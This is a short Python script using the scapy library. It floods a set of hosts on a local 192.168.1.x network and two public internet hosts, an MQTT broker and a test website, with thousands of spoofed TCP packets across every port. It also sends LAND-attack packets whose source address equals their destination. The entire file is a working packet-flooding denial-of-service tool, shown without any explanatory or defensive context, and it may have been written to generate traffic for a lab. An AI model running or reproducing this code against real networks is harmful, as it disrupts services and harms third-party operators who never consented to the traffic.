#! /usr/bin/python

import random
from scapy.all import *
rnd = random.randint(0,2000)
rnd2 = random.randint(0,255)
sub = str(random.randint(34,38))
srcip = '192.168.1.'+ sub
for port in range(1, 65535):
	send(IP(src=srcip, dst="broker.hivemq.com", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	send(IP(src=srcip, dst="192.168.1.190", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=2800)
	send(IP(src=srcip, dst="192.168.1.193", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	send(IP(src=srcip, dst="192.168.1.194", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=2800)
	send(IP(src=srcip, dst="192.168.1.195", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=2800)
	send(IP(src=srcip, dst="192.168.1.184", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	send(IP(src=srcip, dst="192.168.1.152", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	send(IP(src=srcip, dst="testphp.vulnweb.com", ttl=rnd2)/TCP(sport=port,dport=port, ack=rnd, window=rnd), count=1000)
	

	send(IP(src="broker.hivemq.com", dst="broker.hivemq.com")/TCP(sport=port,dport=port), count=2050)
	send(IP(src="192.168.1.190", dst="192.168.1.190")/TCP(sport=port,dport=port), count=1020)
	send(IP(src="192.168.1.193", dst="192.168.1.193")/TCP(sport=80,dport=port), count=2050)
	send(IP(src="192.168.1.194", dst="192.168.1.194")/TCP(sport=80,dport=port), count=1200)
	send(IP(src="192.168.1.195", dst="192.168.1.195")/TCP(sport=port,dport=port), count=2050)
	send(IP(src="192.168.1.184", dst="192.168.1.184")/TCP(sport=8080,dport=port), count=1200)
	send(IP(src="192.168.1.152", dst="192.168.1.152")/TCP(sport=port,dport=port), count=1200)
	send(IP(src="testphp.vulnweb.com", dst="testphp.vulnweb.com")/TCP(sport=port,dport=port), count=1020)
	
